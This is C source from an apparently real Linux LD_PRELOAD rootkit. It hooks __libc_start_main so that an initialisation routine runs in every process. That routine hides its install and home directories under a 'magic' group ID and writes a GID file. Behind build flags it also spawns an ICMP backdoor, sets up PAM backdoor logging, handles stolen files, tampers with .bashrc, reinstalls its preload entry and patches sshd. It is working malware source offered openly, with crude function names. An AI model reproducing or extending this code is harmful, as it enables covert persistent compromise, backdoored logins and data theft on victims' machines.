#define _GNU_SOURCE

#include "config.h"
#include "bdv.h"
#include "sanity.h"

typedef struct {
    void *(*func)();
} syms;
syms symbols[ALL_SIZE];

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <malloc.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <fnmatch.h>
#include <dirent.h>
#include <time.h>
#include <libgen.h>
#include <dlfcn.h>
#include <link.h>
#include <sched.h>
#include <linux/fs.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef FILE_STEAL
#include <sys/mman.h>
#endif

#ifdef HIDE_PORTS
#include <linux/netlink.h>
#endif

#ifdef USE_ICMP_BD
#include <pcap/pcap.h>
#endif

#include <pwd.h>
#include <shadow.h>

#ifdef USE_PAM_BD
#include <utmp.h>
#include <utmpx.h>
#endif

#if defined USE_PAM_BD || defined LOG_LOCAL_AUTH
#include <security/pam_modules.h>
#include <security/_pam_macros.h>
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <syslog.h>
#endif

#define LINE_MAX 2048
#define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])

extern void imgay(void);

void plsdomefirst(void);
#include "includes.h"

extern void imgay(void){
    if(!rknomore()) return;
    printf("INSTALL_DIR:"INSTALL_DIR"\n");
#ifndef PATCH_DYNAMIC_LINKER
    printf("OLD_PRELOAD:"OLD_PRELOAD"\n");
#else
    printf("PRELOAD_FILE:"PRELOAD_FILE"\n");
#endif
    printf("BDVLSO:"BDVLSO"\n");
    printf("MAGIC_GID:"MGIDSTR"\n");
}

void plsdomefirst(void){
    if(notuser(0) || rknomore())
        return;

    gid_t magicgid = readgid();
#ifdef USE_ICMP_BD
    spawnpdoor();
#endif
#ifdef READ_GID_FROM_FILE
    hook(CACCESS,CFOPEN,CCHMOD);
    if((long)call(CACCESS, GID_PATH, F_OK) != 0 && errno == ENOENT){
        FILE *fp = call(CFOPEN, GID_PATH, "w");
        if(fp != NULL){
            fprintf(fp, "%u", magicgid);
            fclose(fp);
            chown_path(GID_PATH, magicgid);
            call(CCHMOD, GID_PATH, 0666);
        }
    }
#endif
    preparedir(HOMEDIR, magicgid);
    hidedircontents(HOMEDIR, magicgid);
    hidedircontents(INSTALL_DIR, magicgid);
#ifdef LOG_USER_EXEC
    preparedir(EXEC_LOGS, magicgid);
#endif
#ifdef LOG_LOCAL_AUTH
    prepareregfile(LOG_PATH, magicgid);
#endif
#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL
    cleanstolen();
#endif
#ifdef CLEANSE_HOMEDIR
    if(!magicusr() && !rkprocup())
        bdvcleanse();
#endif
#ifdef ROOTKIT_BASHRC
    checkbashrc();
#endif
#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
    gidchanger();
#endif
#ifdef ALWAYS_REINSTALL
#ifdef PATCH_DYNAMIC_LINKER
    reinstall(PRELOAD_FILE, NULL, NULL);
#else
    reinstall(OLD_PRELOAD, NULL, NULL);
#endif
#endif
#ifdef SSHD_PATCH_HARD
    sshdpatch();
#endif
}


int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
    plsdomefirst();
    hook(C__LIBC_START_MAIN);
    return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}
